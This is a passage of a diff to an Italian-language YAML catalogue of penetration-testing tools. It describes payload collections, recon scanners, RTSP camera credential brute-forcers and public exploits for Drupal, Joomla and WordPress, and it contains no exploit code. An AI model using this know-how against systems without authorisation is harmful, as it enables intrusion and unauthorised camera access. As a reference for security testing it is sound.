-  desc: "Collezione curata di payload, bypass e cheat-sheet per vulnerabilità web
-    (injection, XSS, XXE, traversal) e fuzzing mirato"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PayloadsAllTheThings</strong>
-    è repository GitHub community-driven che aggrega payload, tecniche bypass e metodologie
-    per exploitation vulnerabilità web. Organizzata per categoria, offre esempi pratici
-    e cheat-sheet utilizzabili direttamente in testing. Include progetti correlati:
-    InternalAllTheThings (AD/Internal Pentest) e HardwareAllTheThings (Hardware/IOT).</p><br><hr><h4
-    class=\"rt-purple\">Categorie principali</h4><p><strong>Injection:</strong> SQL
-    Injection (MySQL, PostgreSQL, MSSQL, Oracle), NoSQL Injection (MongoDB, CouchDB),
-    LDAP Injection, Command Injection (OS command separators), SSTI (Server-Side Template
-    Injection)</p><p><strong>File-based:</strong> Path Traversal (bypass filters,
-    encoding variations), File Upload (magic bytes, extension bypass, polyglot files),
-    XXE (XML External Entity), File Inclusion (LFI/RFI)</p><p><strong>XSS:</strong>
-    Reflected, Stored, DOM-based, bypass WAF, polyglot payloads, CSP bypass</p><p><strong>Deserialization:</strong>
-    Java, PHP, Python, Ruby, .NET deserialization attacks</p><p><strong>Authentication:</strong>
-    JWT attacks, OAuth bypass, SAML attacks, 2FA bypass</p><p><strong>Infrastructure:</strong>
-    SSRF, XXE, CORS misconfiguration, subdomain takeover</p><br><hr><h4 class=\"rt-green\"\
-    >Struttura repository</h4><p>Ogni sezione contiene:</p><ul><li><strong>README.md</strong>
-    - Descrizione vulnerabilità, exploitation methodology, payload multiple</li><li><strong>Intruder/</strong>
-    - File set per Burp Intruder</li><li><strong>Images/</strong> - Screenshot e diagrammi</li><li><strong>Files/</strong>
-    - File referenced nella documentazione</li></ul></p><p>Disponibile anche versione
-    web navigabile: https://swisskyrepo.github.io/PayloadsAllTheThings/</p><br><hr><h4 class=\"\
-    rt-amber\">Utilizzo in testing</h4><p><strong>Fuzzing mirato:</strong> Usare payload
-    specifici per vulnerability type in Burp Intruder, ffuf, o wfuzz.</p><p><strong>Bypass
-    WAF:</strong> Testare encoding variations e obfuscation techniques per evasion.</p><p><strong>Cheat-sheet
-    reference:</strong> Consultare durante exploitation per metodologie step-by-step.</p><p><strong>Remediation
-    verification:</strong> Validare fix testando payload noti post-patching.</p><br><hr><h4
-    class=\"rt-red\">Best practice</h4><p>Repository costantemente aggiornato dalla
-    community: star e pull per latest payloads. Combinare con scanner automatici (Nuclei,
-    ZAP) per coverage completa. Personalizzare payload per target-specific context.
-    Contribuire con nuovi bypass e tecniche via pull request seguendo CONTRIBUTING.md.
-    Anti-virus potrebbe flaggare repository: whitelist path di download.</p><br><hr>"
+  desc: "Collezione curata di payload, bypass e cheat-sheet per vulnerabilità web (injection, XSS, XXE, traversal) e fuzzing mirato"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PayloadsAllTheThings</strong> è un repository GitHub community-driven che aggrega payload, tecniche di bypass e metodologie per exploitation di vulnerabilità web. Organizzata per categoria, offre esempi pratici e cheat-sheet utilizzabili direttamente in testing. Include progetti correlati: InternalAllTheThings (AD/Internal Pentest) e HardwareAllTheThings (Hardware/IOT).</p><br><hr><h4 class=\"rt-purple\">Categorie Principali</h4><p><strong>Injection:</strong> SQL Injection (MySQL, PostgreSQL, MSSQL, Oracle), NoSQL Injection (MongoDB, CouchDB), LDAP Injection, Command Injection (separatori di comandi OS), SSTI (Server-Side Template Injection)</p><p><strong>File-based:</strong> Path Traversal (bypass filters, encoding variations), File Upload (magic bytes, extension bypass, file poliglotti), XXE (XML External Entity), File Inclusion (LFI/RFI)</p><p><strong>XSS:</strong> Reflected, Stored, DOM-based, bypass WAF, payload poliglotti, bypass CSP</p><p><strong>Deserialization:</strong> Attacchi di deserializzazione Java, PHP, Python, Ruby, .NET</p><p><strong>Authentication:</strong> Attacchi JWT, bypass OAuth, attacchi SAML, bypass 2FA</p><p><strong>Infrastructure:</strong> SSRF, XXE, misconfiguration CORS, subdomain takeover</p><br><hr><h4 class=\"rt-green\">Struttura Repository</h4><p>Ogni sezione contiene:</p><ul><li><strong>README.md</strong> - Descrizione vulnerabilità, metodologia di exploitation, payload multipli</li><li><strong>Intruder/</strong> - File set per Burp Intruder</li><li><strong>Images/</strong> - Screenshot e diagrammi</li><li><strong>Files/</strong> - File referenziati nella documentazione</li></ul><p>Disponibile anche versione web navigabile: https://swisskyrepo.github.io/PayloadsAllTheThings/</p><br><hr><h4 class=\"rt-amber\">Utilizzo in Testing</h4><p><strong>Fuzzing mirato:</strong> Usare payload specifici per tipo di vulnerabilità in Burp Intruder, ffuf o wfuzz.</p><p><strong>Bypass WAF:</strong> Testare encoding variations e tecniche di obfuscation per evasion.</p><p><strong>Cheat-sheet reference:</strong> Consultare durante exploitation per metodologie step-by-step.</p><p><strong>Remediation verification:</strong> Validare fix testando payload noti post-patching.</p><br><hr><h4 class=\"rt-red\">Best Practice</h4><p>Repository costantemente aggiornato dalla community: mettere una star e fare pull per gli ultimi payload. Combinare con scanner automatici (Nuclei, ZAP) per coverage completa. Personalizzare payload per target-specific context. Contribuire con nuovi bypass e tecniche via pull request seguendo CONTRIBUTING.md. L'antivirus potrebbe flaggare il repository: whitelist del path di download necessaria.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Wordlists"]
+  category_path: [ "00_Common", "Wordlists" ]
   notes:
 
 - id: "wordlist-portswigger"
   name: "PortSwigger"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "wordlist"
-  phases: ["00_Common"]
-  caps: ["burp-integration", "content-discovery", "intruder"]
+  installation: "GitHub"
   repo: "https://github.com/PortSwigger/wordlist-extractor"
-  desc: "Wordlist e utility ecosistema Burp Suite per content discovery, fuzzing parametri
-    e integration con Intruder/Extender"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PortSwigger Wordlists</strong>
-    è collezione utility e dizionari integrati nell'ecosistema Burp Suite. Include
-    tool per estrarre/generare wordlist da asset applicazione target e alimentarli
-    direttamente in Burp Intruder ed extensions.</p><br><hr><h4 class=\"rt-purple\">Componenti</h4><p><strong>Wordlist
-    Extractor:</strong> Tool per generare wordlist custom da:</p><ul><li>Response
-    bodies di richieste Burp</li><li>JavaScript files e source maps</li><li>HTML comments
-    e metadata</li><li>API responses e JSON structures</li></ul></p><p><strong>Built-in
-    wordlists:</strong> Burp Suite include dizionari predefiniti per:</p><ul><li>Username/password
-    common</li><li>Directories e filenames</li><li>Parameters fuzzing</li><li>Backup
-    files extensions</li></ul></p><br><hr><h4 class=\"rt-green\">Integration workflow</h4><p><strong>1.
-    Estrazione context-aware:</strong> Durante proxy browsing, catturare richieste
-    e usare wordlist extractor per generare dizionari basati su naming conventions
-    osservate.</p><p><strong>2. Intruder payloads:</strong> Importare wordlist custom
-    in Burp Intruder payload sets per fuzzing mirato di directories, parameters, headers.</p><p><strong>3.
-    Content Discovery:</strong> Usare con Burp Scanner o Content Discovery extension
-    per enumerazione endpoint nascosti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>API
-    testing:</strong> Estrarre endpoint patterns da Swagger/OpenAPI documentation
-    catturato in proxy.</p><p><strong>Parameter discovery:</strong> Generare lista
-    parametri da JavaScript analysis per parameter pollution testing.</p><p><strong>Backup
-    file hunting:</strong> Creare wordlist con extensions e suffixes comuni (.bak,
-    .old, .backup) combinati con filename osservati.</p><br><hr><h4 class=\"rt-red\">Best
-    practice</h4><p>Combinare wordlist PortSwigger con SecLists per coverage estesa.
-    Usare payload processing rules in Intruder per encoding/encryption on-the-fly.
-    Salvare wordlist generate per riuso su target simili. Integrare con Turbo Intruder
-    extension per high-speed fuzzing su wordlist grandi.</p><br><hr>"
+  desc: "Wordlist e utility ecosistema Burp Suite per content discovery, fuzzing parametri e integration con Intruder/Extender"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PortSwigger Wordlists</strong> è una collezione di utility e dizionari integrati nell'ecosistema Burp Suite. Include tool per estrarre/generare wordlist da asset dell'applicazione target e alimentarli direttamente in Burp Intruder ed extensions.</p><br><hr><h4 class=\"rt-purple\">Componenti</h4><p><strong>Wordlist Extractor:</strong> Tool per generare wordlist custom da:</p><ul><li>Response bodies di richieste Burp</li><li>File JavaScript e source maps</li><li>Commenti HTML e metadata</li><li>API responses e strutture JSON</li></ul><p><strong>Built-in wordlists:</strong> Burp Suite include dizionari predefiniti per:</p><ul><li>Username/password comuni</li><li>Directory e filename</li><li>Fuzzing parametri</li><li>Estensioni di file backup</li></ul><br><hr><h4 class=\"rt-green\">Integration Workflow</h4><p><strong>1. Estrazione context-aware:</strong> Durante il proxy browsing, catturare richieste e usare wordlist extractor per generare dizionari basati sulle naming conventions osservate.</p><p><strong>2. Intruder payloads:</strong> Importare wordlist custom in Burp Intruder payload sets per fuzzing mirato di directory, parametri, header.</p><p><strong>3. Content Discovery:</strong> Usare con Burp Scanner o Content Discovery extension per enumerazione di endpoint nascosti.</p><br><hr><h4 class=\"rt-amber\">Casi d'Uso</h4><p><strong>API testing:</strong> Estrarre pattern di endpoint da documentazione Swagger/OpenAPI catturata nel proxy.</p><p><strong>Parameter discovery:</strong> Generare lista parametri da analisi JavaScript per parameter pollution testing.</p><p><strong>Backup file hunting:</strong> Creare wordlist con estensioni e suffissi comuni (.bak, .old, .backup) combinati con filename osservati.</p><br><hr><h4 class=\"rt-red\">Best Practice</h4><p>Combinare wordlist PortSwigger con SecLists per coverage estesa. Usare payload processing rules in Intruder per encoding/encryption on-the-fly. Salvare wordlist generate per riuso su target simili. Integrare con Turbo Intruder extension per high-speed fuzzing su wordlist grandi.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Wordlists"]
+  category_path: [ "00_Common", "Wordlists" ]
   notes:
 
 - id: "wordlist-seclists-2025-2"
   name: "SecLists"
   version: "2025.2"
   icon: "../app/icons/github.svg"
-  kind: "wordlist"
-  phases: ["00_Common"]
-  caps: ["user-passlists", "content-discovery", "fuzzing", "payloads"]
+  installation: "GitHub"
   repo: "https://github.com/danielmiessler/SecLists"
   desc: "Collezione OWASP di wordlist per pentest (user/pass, dir/file, fuzzing, pattern
     sensibili, web-shell) standard de-facto per discovery e testing"
@@ -1099,16 +354,14 @@
     rischio local file include. Repository aggiornato regolarmente: pull latest prima
     di engagement. Licenza MIT. Dimensione repository completo ~1.3GB.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Wordlists"]
+  category_path: [ "00_Common", "Wordlists" ]
   notes:
 
 - id: "subbrute-77"
   name: "subbrute-77"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["01_Information_Gathering"]
-  caps: ["dns-bruteforce", "subdomain-enum", "resolver-rotation", "wildcard-detection"]
+  installation: "GitHub"
   repo: "https://github.com/TheRook/subbrute"
   desc: "Brute forcer DNS per subdomain enumeration usando open resolvers, con wildcard
     detection e caching per bypass rate-limit"
@@ -1142,17 +395,14 @@
     aggressivo grazie a resolver distribution. Best practice: combinare SubBrute (active)
     con Amass/Subfinder (passive) per coverage completa subdomain discovery.</p><br><hr>"
   best_in: false
-  category_path: ["01_Information_Gathering", "01_Recon", "Infrastructure", "DNS_Subdomains"]
+  category_path: [ "01_Information_Gathering", "01_Recon", "Infrastructure", "DNS_Subdomains" ]
   notes:
 
 - id: "dirsearch"
   name: "dirsearch"
   version: "0.4.3"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["01_Information_Gathering"]
-  caps: ["content-discovery", "bruteforce-dirs", "wordlists", "extensions", "resume",
-    "proxy"]
+  installation: "GitHub"
   repo: "https://github.com/maurosoria/dirsearch"
   desc: "Web path scanner per directory/file nascosti con filtri status/lunghezza,
     gestione estensioni, resume e proxy support"
@@ -1190,16 +440,14 @@
     comuni su CMS con URL rewriting: validare manualmente finding interessanti. Per
     API testing, considerare extension-less scanning con wordlist API-specific.</p><br><hr>"
   best_in: false
-  category_path: ["01_Information_Gathering", "01_Recon", "Web", "Content_Discovery"]
+  category_path: [ "01_Information_Gathering", "01_Recon", "Web", "Content_Discovery" ]
   notes:
 
 - id: "aquatone-linux-amd64"
   name: "aquatone_linux_amd64"
   version: "1.7.0"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["01_Information_Gathering"]
-  caps: ["visual-recon", "screenshotting", "html-report", "host-triage"]
+  installation: "GitHub"
   repo: "https://github.com/michenriksen/aquatone"
   desc: "Tool visual recon per screenshot massivi di servizi web con report HTML navigabile
     e triage rapido per host/porta grouping"
@@ -1237,17 +485,14 @@
     HTML può diventare pesante: segmentare scan per subnet o scope. Integrare con
     crawler (katana, gospider) post-triage per deep discovery sugli interessanti identificati.</p><br><hr>"
   best_in: false
-  category_path: ["01_Information_Gathering", "01_Recon", "Web", "Fingerprinting",
-    "Visual_Recon"]
+  category_path: [ "01_Information_Gathering", "01_Recon", "Web", "Fingerprinting", "Visual_Recon" ]
   notes:
 
 - id: "whatwaf-1-9"
   name: "WhatWaf"
   version: "1.9"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["01_Information_Gathering"]
-  caps: ["waf-detection", "waf-fingerprint", "bypass-tips"]
+  installation: "GitHub"
   repo: "https://github.com/Ekultek/WhatWaf"
   desc: "Fingerprint dei WAF tramite pattern di header/redirect/pagine di blocco con
     suggerimenti di tuning. Guida l'adattamento di fuzzing/exploitation per ridurre
@@ -1279,17 +524,14 @@
     con test manuali e fuzzing controllato. Output bypass suggestions sono punto di
     partenza, non garanzia di successo.</p><br><hr>"
   best_in: false
-  category_path: ["01_Information_Gathering", "01_Recon", "Web", "Fingerprinting",
-    "WAF"]
+  category_path: [ "01_Information_Gathering", "01_Recon", "Web", "Fingerprinting", "WAF" ]
   notes:
 
 - id: "paramspider"
   name: "paramspider"
   version: "1.0.1"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["01_Information_Gathering"]
-  caps: ["params-discovery", "wayback-mining", "scope-filtering", "ext-exclusion"]
+  installation: "GitHub"
   repo: "https://github.com/devanshbatham/ParamSpider"
   desc: "Tool per estrazione URL/parametri da archivi web (Wayback Machine) con scope
     filtering e exclusion list per fuzzing preparation"
@@ -1326,16 +568,14 @@
     archivi web. ParamSpider output contiene potenzialmente sensitive info: proteggere
     file results appropriatamente.</p><br><hr>"
   best_in: false
-  category_path: ["01_Information_Gathering", "01_Recon", "Web", "Params_Discovery"]
+  category_path: [ "01_Information_Gathering", "01_Recon", "Web", "Params_Discovery" ]
   notes:
 
 - id: "smb-enum"
   name: "SMB-enum"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["01_Information_Gathering"]
-  caps: ["smb-enum", "shares", "null-session", "rid-cycling"]
+  installation: "GitHub"
   repo: ""
   desc: "Raccolta tecniche/utility per enumerazione SMB (shares, permessi, null session,
     RID cycling) e identificazione misconfiguration"
@@ -1381,17 +621,14 @@
     disable null session, enable SMB signing, restrict anonymous access, monitor eventi
     4624/4625/529.</p><br><hr>"
   best_in: false
-  category_path: ["01_Information_Gathering", "02_Enumeration", "Infrastructure",
-    "SMB"]
+  category_path: [ "01_Information_Gathering", "02_Enumeration", "Infrastructure", "SMB" ]
   notes:
 
 - id: "postman"
   name: "Postman"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "app"
-  phases: ["01_Information_Gathering"]
-  caps: ["api-client", "collections", "environment", "auth-testing"]
+  installation: "GitHub"
   repo: "https://www.postman.com/downloads/"
   desc: "Client API per creare/organizzare richieste, variabili ambiente e collezioni
     condivisibili con test automation e auth support"
@@ -1432,16 +669,14 @@
     Postman proxy settings per routing via Burp per analysis approfondita. Import
     HAR files da browser DevTools per quick collection creation.</p><br><hr>"
   best_in: false
-  category_path: ["01_Information_Gathering", "02_Enumeration", "Web", "API"]
+  category_path: [ "01_Information_Gathering", "02_Enumeration", "Web", "API" ]
   notes:
 
 - id: "cmseek-v-1-1-3"
   name: "CMSeeK"
   version: "1.1.3"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["01_Information_Gathering"]
-  caps: ["cms-detection", "fingerprint", "deep-scan", "version-detect"]
+  installation: "GitHub"
   repo: "https://github.com/Tuhinshubhra/CMSeeK"
   desc: "Tool riconoscimento e fingerprinting CMS con scansioni guidate per detection
     versione, moduli e potenziali vulnerabilità"
@@ -1480,16 +715,14 @@
     Validare finding con scanner dedicati prima di exploitation. Non sempre aggiornato
     con latest CMS versions: complementare con manual verification.</p><br><hr>"
   best_in: false
-  category_path: ["01_Information_Gathering", "02_Enumeration", "Web", "CMS"]
+  category_path: [ "01_Information_Gathering", "02_Enumeration", "Web", "CMS" ]
   notes:
 
 - id: "cmsmap"
   name: "CMSmap"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["01_Information_Gathering"]
-  caps: ["cms-scan", "vuln-checks", "wordpress", "joomla", "drupal", "moodle"]
+  installation: "GitHub"
   repo: "https://github.com/dionach/CMSmap"
   desc: "Scanner Python per CMS con autodetect e controlli vulnerabilità comuni su
     WordPress/Joomla/Drupal/Moodle con integration Exploit-DB"
@@ -1531,16 +764,14 @@
     Validare finding con scanner verticali (WPScan, JoomScan) prima di exploitation.
     Usage su target senza consenso è illegale.</p><br><hr>"
   best_in: false
-  category_path: ["01_Information_Gathering", "02_Enumeration", "Web", "CMS"]
+  category_path: [ "01_Information_Gathering", "02_Enumeration", "Web", "CMS" ]
   notes:
 
 - id: "joomlascan"
   name: "JoomlaScan"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["01_Information_Gathering"]
-  caps: ["joomla-enum", "components-detect", "fingerprint"]
+  installation: "GitHub"
   repo: "https://github.com/drego85/JoomlaScan"
   desc: "Scanner per componenti Joomla che rileva estensioni esposte, directory indicizzate
     e file per version identification"
@@ -1571,16 +802,14 @@
     triage. Validare componenti emersi con accesso manuale per evitare false positive.
     Tool specifico per Joomla: usare CMSmap o CMSeeK per detection multi-CMS.</p><br><hr>"
   best_in: false
-  category_path: ["01_Information_Gathering", "02_Enumeration", "Web", "CMS", "Joomla"]
+  category_path: [ "01_Information_Gathering", "02_Enumeration", "Web", "CMS", "Joomla" ]
   notes:
 
 - id: "katana-linux-amd64"
   name: "katana_linux_amd64"
   version: "1.2.2"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["01_Information_Gathering"]
-  caps: ["crawler", "spider", "javascript-aware", "sitemap"]
+  installation: "GitHub"
   repo: "https://github.com/projectdiscovery/katana"
   desc: "Crawler web rapido (ProjectDiscovery) con estrazione endpoint, JS, subpath;
     output per fuzzing/ASSETs."
@@ -1593,17 +822,14 @@
     class=\"rt-blue\">Uso e OPSEC</h4><p>Limitare lo scope, rispettare robots e impostare
     throttle per evitare eccessivo rumore nei log target.</p><br><hr>"
   best_in: false
-  category_path: ["01_Information_Gathering", "02_Enumeration", "Web", "Crawling",
-    "Active"]
+  category_path: [ "01_Information_Gathering", "02_Enumeration", "Web", "Crawling", "Active" ]
   notes:
 
 - id: "findsploit-2-0"
   name: "Findsploit"
   version: "2.0"
   icon: "../app/icons/github.svg"
-  kind: "framework"
-  phases: ["02_Exploitation"]
-  caps: ["exploit-search", "cve-mapping", "aux-suggest"]
+  installation: "GitHub"
   repo: "https://github.com/1N3/Findsploit"
   desc: "Wrapper CLI che interroga multiple fonti (Exploit-DB/Metasploit/GitHub) per
     ricerca PoC ed exploit da keyword/versioni/CVE"
@@ -1636,16 +862,14 @@
     results richiedono code review prima di execution. Documentare exploit source
     e version per reporting compliance.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "General"]
+  category_path: [ "02_Exploitation", "General" ]
   notes:
 
 - id: "cameradar-5-0-4"
   name: "cameradar"
   version: "5.0.4"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["rtsp-scan", "route-bruteforce", "creds-attack", "docker"]
+  installation: "GitHub"
   repo: "https://github.com/Ullaakut/cameradar"
   desc: "Scanner/attacker RTSP che individua stream, tenta credenziali/route noti
     per esporre feed video con workflow scan→attack→print integrato"
@@ -1679,16 +903,14 @@
     build dependencies. Operare solo su target autorizzati: unauthorized camera access
     è reato.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
+  category_path: [ "02_Exploitation", "Infrastructure", "RTSP" ]
   notes:
 
 - id: "hikpwn"
   name: "HikPwn"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["hikvision-enum", "vuln-checks", "active-scan"]
+  installation: "GitHub"
   repo: "https://github.com/4n4nk3/HikPwn"
   desc: "Scanner dedicato device Hikvision con enum attiva/passiva, check porte/servizi
     e verification vulnerabilità note (ICSA-17-124-01)"
@@ -1720,16 +942,14 @@
     educazionale: uso production richiede cautela estrema. Coordinare con owner device
     per minimizzare downtime e rischi operativi.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
+  category_path: [ "02_Exploitation", "Infrastructure", "RTSP" ]
   notes:
 
 - id: "rtsp-routes-wordlist"
   name: "routes_wordlist.txt"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "wordlist"
-  phases: ["02_Exploitation"]
-  caps: ["rtsp-routes", "content-discovery"]
+  installation: "GitHub"
   repo: ""
   desc: "Wordlist percorsi RTSP comuni (/live.sdp, /Streaming/Channels/101, /h264)
     per brute-force mount point nascosti su stream video"
@@ -1756,16 +976,14 @@
     per documentation visuale. Manufacturer-specific routes hanno higher success rate:
     prioritizzare in base a fingerprint device.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
+  category_path: [ "02_Exploitation", "Infrastructure", "RTSP" ]
   notes:
 
 - id: "rtsp-authgrinder"
   name: "rtsp_authgrinder"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["rtsp-bruteforce", "basic-digest", "multi-thread"]
+  installation: "GitHub"
   repo: "https://github.com/tektengu/rtsp_authgrinder"
   desc: "Brute-forcer credenziali RTSP con supporto Basic auth e multi-threading per
     DVR/IP-cam quando route stream è noto"
@@ -1792,16 +1010,14 @@
     con finestre di test autorizzate. Output strutturato facilita parsing per reporting
     e integrazione con altri tool di exploitation.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
+  category_path: [ "02_Exploitation", "Infrastructure", "RTSP" ]
   notes:
 
 - id: "rtsp-crack-1-0-3"
   name: "rtsp_crack"
   version: "1.0.3"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["rtsp-bruteforce", "gui", "digest-support"]
+  installation: "GitHub"
   repo: ""
   desc: "Bruteforcer/enum per endpoint RTSP: prova percorsi e credenziali comuni per
     individuare stream accessibili."
@@ -1814,16 +1030,14 @@
     limiti legali; molti dispositivi espongono stream sensibili. Limitare i thread
     e usare scope autorizzato.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
+  category_path: [ "02_Exploitation", "Infrastructure", "RTSP" ]
   notes:
 
 - id: "rtsp-digest-auth-bruteforcer"
   name: "RTSP-Digest-Auth-Bruteforcer"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["digest-bruteforce", "header-crafting"]
+  installation: "GitHub"
   repo: ""
   desc: "PoC/utility per forzare autenticazione Digest su server RTSP con wordlist
     e supporto multi‑thread."
@@ -1835,16 +1049,14 @@
     rumore.</li></ul><br><hr><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Eseguire solo su infrastrutture
     autorizzate; monitorare account lockout e impatto di rete.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
+  category_path: [ "02_Exploitation", "Infrastructure", "RTSP" ]
   notes:
 
 - id: "rtsp-findingsomefun"
   name: "RTSP-FindingSomeFun"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["mass-scan", "bruteforce", "wordlist-combos"]
+  installation: "GitHub"
   repo: "https://github.com/ThatNotEasy/RTSP-FindingSomeFun"
   desc: "Scanner/Bruteforcer massivo per RTSP con multithreading e wordlist per individuare
     stream su IP list."
@@ -1856,16 +1068,14 @@
     revisione manuale.</li></ul><br><hr><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Strumento
     ad alto impatto: regolare thread/timeout, rispettare privacy e limiti legali.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
+  category_path: [ "02_Exploitation", "Infrastructure", "RTSP" ]
   notes:
 
 - id: "rtspscanner"
   name: "RTSPScanner"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["rtsp-scan", "path-testing", "api-output"]
+  installation: "GitHub"
   repo: "https://github.com/BeardedTek-com/RTSPScanner"
   desc: "Utility Python per enum sorgenti RTSP su host/network con path testing e
     API output per integration pipeline (rtsp-simple-server)"
@@ -1892,16 +1102,14 @@
     logic (filtering, notification, database storage). Rispettare privacy e regulations
     quando scanning video devices.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
+  category_path: [ "02_Exploitation", "Infrastructure", "RTSP" ]
   notes:
 
 - id: "drupalgeddon"
   name: "drupalgeddon"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "exploit"
-  phases: ["02_Exploitation"]
-  caps: ["rce", "sql-injection", "cve-2014-3704"]
+  installation: "GitHub"
   repo: ""
   desc: "Exploit storico Drupal 7 (CVE-2014-3704) con SQLi in core per creazione admin
     o code execution, utile in legacy assessment"
@@ -1930,16 +1138,14 @@
     patching, security monitoring. Testing drupalgeddon exploits solo in lab isolato
     con scope chiaro: exploitation produce permanent database changes.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "Drupal"]
+  category_path: [ "02_Exploitation", "Web", "CMS_Exploits", "Drupal" ]
   notes:
 
 - id: "drupalgeddon2"
   name: "drupalgeddon2"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "exploit"
-  phases: ["02_Exploitation"]
-  caps: ["rce", "cve-2018-7600", "unauth"]
+  installation: "GitHub"
   repo: "https://github.com/dreadlocked/Drupalgeddon2"
   desc: "PoC CVE-2018-7600 (SA-CORE-2018-002) per injection Forms API che porta a
     RCE su Drupal 7/8 unpatched per initial access rapido"
@@ -1975,16 +1181,14 @@
     WAF virtual patching se update impossibile, review access logs per IOC exploitation
     attempts.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "Drupal"]
+  category_path: [ "02_Exploitation", "Web", "CMS_Exploits", "Drupal" ]
   notes:
 
 - id: "joomla-bruteforce"
   name: "joomla-bruteforce"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "exploit"
-  phases: ["02_Exploitation"]
-  caps: ["auth-bruteforce", "session-handling", "proxy"]
+  installation: "GitHub"
   repo: "https://github.com/ajnik/joomla-bruteforce"
   desc: "Script per brute-force credenziali login Joomla con proxy support e session
     handling quando non esistono CVE note ma hardening debole"
@@ -2020,16 +1224,14 @@
     databases invece brute-force blind. Se password policies strong, brute-force ineffective:
     focus su other vectors.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "Joomla"]
+  category_path: [ "02_Exploitation", "Web", "CMS_Exploits", "Joomla" ]
   notes:
 
 - id: "joomla-dir-traversal"
   name: "joomla_dir_trav.py"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "exploit"
-  phases: ["02_Exploitation"]
-  caps: ["path-traversal", "file-read", "artifact-extract"]
+  installation: "GitHub"
   repo: ""
   desc: "Exploit per directory traversal Joomla che consente lettura/cancellazione
     file fuori path previsto per exfiltration config/log"
@@ -2060,16 +1262,14 @@
     endpoint/parametri/path specifici. Verificare patch effectiveness con same vectors
     post-remediation. Coordinate con development team per comprehensive fix validation.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "Joomla"]
+  category_path: [ "02_Exploitation", "Web", "CMS_Exploits", "Joomla" ]
   notes:
 
 - id: "wp-cve-2024-9047"
   name: "CVE-2024-9047"
   version: "2024-9047"
   icon: "../app/icons/github.svg"
-  kind: "exploit"
-  phases: ["02_Exploitation"]
-  caps: ["path-traversal", "arbitrary-read", "wp-file-upload"]
+  installation: "GitHub"
   repo: ""
   desc: "PoC/notes per CVE‑2024‑9047 (WordPress File Upload): path traversal e file
     read non autenticato (<=4.24.11)."
@@ -2082,16 +1282,14 @@
     in staging o con autorizzazione scritta. Applicare update del plugin oltre 4.24.11
     e limitare accessi.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "WordPress"]
+  category_path: [ "02_Exploitation", "Web", "CMS_Exploits", "WordPress" ]
   notes:
 
 - id: "wp-wpdiscuz-rce"
   name: "RCE - wpDiscuz"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "exploit"
-  phases: ["02_Exploitation"]
-  caps: ["unauth-file-upload", "rce", "cve-2020-24186"]
+  installation: "GitHub"
   repo: "https://www.exploit-db.com/exploits/49967"
   desc: "Exploit RCE non autenticato per wpDiscuz (<=7.0.4, CVE‑2020‑24186): upload
     arbitrario e code execution."
@@ -2103,16 +1301,14 @@
     di mitigazione e detection nei log.</li></ul><br><hr><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Limitare
